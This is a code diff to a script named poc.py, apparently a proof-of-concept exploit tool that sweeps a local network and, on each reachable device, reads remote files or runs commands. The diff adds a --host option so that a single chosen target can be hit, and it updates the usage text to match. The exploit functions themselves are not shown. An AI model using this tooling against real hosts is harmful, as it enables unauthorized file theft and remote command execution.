@@ -117,6 +117,9 @@ def set_up_menu():
     parser.add_option('-p', '--pkg',
                       action="store", dest="package",
                       help="Package name", default="")
+    parser.add_option('--ip', '--host',
+                      action="store", dest="host",
+                      help="Target host IP", default="")
     parser.add_option('-n', '--network',
                       action="store", dest="network",
                       help="Network to scan", default="192.168.0.")
@@ -134,8 +137,7 @@ def main():
     if len(sys.argv) > 1 and sys.argv[1] == 'list':
         show_available_cmds()
     elif options.filepath != '' or options.cmd != '':
-        for ip in range(0, 255):
-            addr = options.network + str(ip)
+        def scan_host(addr):
             if verbose:
                 print('[*] Checking address: ' + addr)
 
@@ -147,11 +149,18 @@ def main():
                     get_file(addr, options.filepath)
                 elif options.cmd != '':
                     execute_cmd(addr, options.cmd, options.package)
+
+        if options.host != '':
+            scan_host(options.host)
+        else:
+            for ip in range(0, 255):
+                scan_host(options.network + str(ip))
     else:
         print('Usage:')
         print('- python3 poc.py list')
         print('- python3 poc.py --get-file [filepath]')
         print('- python3 poc.py --cmd [cmd]')
+        print('- python3 poc.py --cmd [cmd] --host [target_host]')
         print('- python3 poc.py --cmd [cmd] --network [network]')
         print('- python3 poc.py --cmd [cmd] --pkg [package_name]')
         print('- python3 poc.py --verbose --cmd [cmd] --pkg [package_name]')
